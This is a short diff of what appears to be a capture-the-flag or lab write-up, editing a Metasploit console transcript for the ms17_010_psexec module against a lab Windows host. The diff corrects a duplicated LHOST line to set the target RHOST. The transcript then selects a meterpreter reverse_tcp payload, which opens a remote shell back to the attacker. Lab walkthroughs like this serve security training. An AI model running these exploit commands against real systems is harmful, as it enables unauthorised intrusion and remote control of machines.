@@ -911,8 +911,8 @@ Also known as:
 
 View the full module info with the info -d command.
 
-[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.4
-LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOST 10.129.2.141
+RHOST => 10.129.2.141
 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.4
 LHOST => 10.10.14.4
 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set payload windows/meterpreter/reverse_tcp
